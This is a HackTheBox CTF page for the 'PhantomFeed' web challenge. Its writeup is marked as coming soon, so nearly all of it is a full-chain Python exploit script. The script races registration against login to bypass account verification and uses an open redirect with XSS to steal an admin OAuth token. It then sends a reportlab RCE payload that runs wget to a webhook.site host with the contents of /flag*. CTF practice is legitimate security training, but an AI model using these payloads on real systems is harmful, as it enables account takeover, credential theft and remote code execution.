---
layout: ctf
title: "HackTheBox: PhantomFeed"
platform: "HackTheBox"
type: "Challenge"
difficulty: "Hard"
image: "/assets/img/ctf/web_challenge.png"
tags: [Web, Code-Review, Race-Condition, Open-Redirect, Insecure-Oauth, XSS, RCE]
date: 2026-07-11
---

// Full-Chain Exploit. Writeup coming soon.

Full-Chain Exploit:

```python
import random
import string
import requests
import threading
from urllib.parse import quote_plus

def post(addr, body: dict, headers: dict = None):
    if not headers:
        return requests.post("http://" + addr, data=body, allow_redirects=False)

    return requests.post("http://" + addr, data=body, allow_redirects=False, headers=headers)

def get(addr, headers: dict = None):
    if not headers:
        return requests.get("http://" + addr, allow_redirects=False)

    return requests.get("http://" + addr, allow_redirects=False, headers=headers)

def login_works(addr, credentials: (str, str), buffer: list) -> str:
    """
    Buffer is just a list that will serve as a buffer to store the cookie in memory independent from threads' local cache.
    """

    username, password = credentials
    response = post(addr + "/phantomfeed/login", {"username": username, "password": password})

    if response.status_code != 401:
        cookie = response.headers.get("Set-Cookie")
        buffer[0] = cookie
        return response.headers.get("Set-Cookie")

def random_string(length: int) -> str:
    return ''.join([random.choice(string.ascii_letters) for i in range(length)])

def __register(addr, credentials: (str, str)):
    username, password = credentials
    post(addr + "/phantomfeed/register", {"username": username, "password": password, "email": f"{username}@phantomfeed.htb"})

def register_user(addr) -> (str, str, str):
    """
    Registers randomly generated credentials by exploiting
    a race condition vulnerability in the registration process
    at the PhantomFeed/register endpoint (blueprints/routes.py/reigster()).

    It works because the default value set in the database for `verified` is `True`.
    It only sets to `False` only after the credentials are registered in the database.

    To exploit this, we have to concurrently send registration requests and login requests
    using the same credentials. Spamming this will make sure that at least one of the login requests
    goes through as the value `verified` is still set to `True` by default before the application sets it to `False`.

    :return tuple(username, password, valid cookie)
    """

    username = random_string(16)
    password = username

    buffer = [None]
    threads = []

    t1 = threading.Thread(target=__register, args=(addr, (username, password)))
    threads.append(t1)
    t1.start()

    for i in range(50):
        t2 = threading.Thread(target=login_works, args=(addr, (username, password), buffer))
        threads.append(t2)
        t2.start()

        if buffer[0]:
            jwt_tokn = buffer[0]
            break

    for t in threads:
        t.join()

    if not buffer[0]:
        username, password, buffer[0] = register_user(addr)

    return (username, password, buffer[0])

def test_connection(addr, jwt_token: str) -> bool:
    if get(addr + "/phantomfeed/feed", headers={"Cookie": jwt_token}).status_code == 200:
        print("[*] Tested jwt token. Works perfectly.")

    else:
        print("[-] Something failed terribly. Please execute exploit again or ask ChatGPT lol.")
        print("[-] Looser ok bye", end='\r')
        exit(0)

def oauth2_exploit(addr, jwt_token: str, webhook: str) -> str:
    """
    Exploits the fact that the client opens any `redirect_url` we provide:
    # phantom-feed/application/util/bot.py
    45 | client.add_cookie(cookie)
    46 | client.get("http://127.0.0.1:5000" + link)
    47 | time.sleep(10)
    We exploit this by adding `@` at the beginning of our link making it go to `http://127.0.0.1:5000@<link>`,
    effectively bypassing the link to localhost:5000 routing the bot to where ever we wish.
    We send the bot to the `oauth2/code` open-redirect endpoint which is vulnerable to XSS.
    There, we grab the cookie that was set to `localhost` (instead of localhost:5000) which is another misconfiguration
    on the client side. On top of that, although `Secure` and `HTTPOnly` cookies are set, the cookie is actually
    found *in* the html page making the `Secure` and `HTTPOnly` hardenings useless.
    """
    payload = "?<script>window.location.href=`%s?token=${btoa(document.body.innerHTML)}`</script>" % (webhook,)
    redirect_url = webhook + quote_plus(payload)
    link    = "@127.0.0.1:3000/phantomfeed/oauth2/code?client_id=phantom-market&redirect_url=" + redirect_url

    print("[*] Sending payload. Just chill a second (or 10)..", end='\r')
    headers = {"Cookie": jwt_token}
    response = post(addr + "/phantomfeed/feed", body={"content": "slop.", "market_link": link}, headers=headers)
    if not response.ok:
        print("[-] Fucked up: " + response.text)
        print("[-] Just get a real hobby atp and touch some grass. ~_~")
        exit(-1)  # ferocious

    print("[*] Sent payload. Check out your webhook listener!")

    authorization_code = input("[?] Authorization code: ")
    response = get(addr + f"/phantomfeed/oauth2/token?authorization_code={authorization_code}&client_id=phantom-market&redirect_url={redirect_url}", headers=headers)

    if not response.ok:
        print("[-] Fucked up: " + response.text)
        print("[-] It's okay. Really. Just look for another hobby.")
        exit(-2)  # extremely ferocious

    access_token = response.json().get("access_token")
    if not access_token:
        print("[??] Could not find access token. Make sure you parse the response correctly: " + response.text)
        exit(-3)

    print("[+] Grabbed admin access token.")
    return access_token

def html2pdf_exploit(addr, jwt_token, webhook):
    """
    Exploits the vulnerable library reportlab==3.6.12 the /backend uses using
    the freshly gained administrative jwt access token. Performs RCE to read flag and
    send to webhook.
    """
    payload = "[[egetattr(pow, Word('__globals__'))['os'].system('wget " + webhook + "?$(cat /flag*)') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"
    response = post(addr + "/backend/orders/html", body={"color": payload}, headers={"Authorization": "Bearer " + jwt_token})

    if not response.ok:
        print("[-] Something failed at last stage: ", response.status_code, response.text)
        exit(0)

    print("[+] Exploited successfully. Check out your webhook listener for the flag!")

def main(addr, webhook):
    print("[*] Wait a second to register a user..", end='\r')
    username, password, jwt_token = register_user(addr)
    print(f"[+] Registered user: username={username}, got JWT token.")
    test_connection(addr, jwt_token)

    jwt_token = oauth2_exploit(addr, jwt_token, webhook)
    test_connection(addr, "token=" + jwt_token)

    print(jwt_token)
    html2pdf_exploit(addr, jwt_token, webhook)

if __name__ == '__main__':
    main("127.0.0.1:1337", "https://webhook.site/0828e735-51d2-428d-b32e-5fec2f519bb1")
```
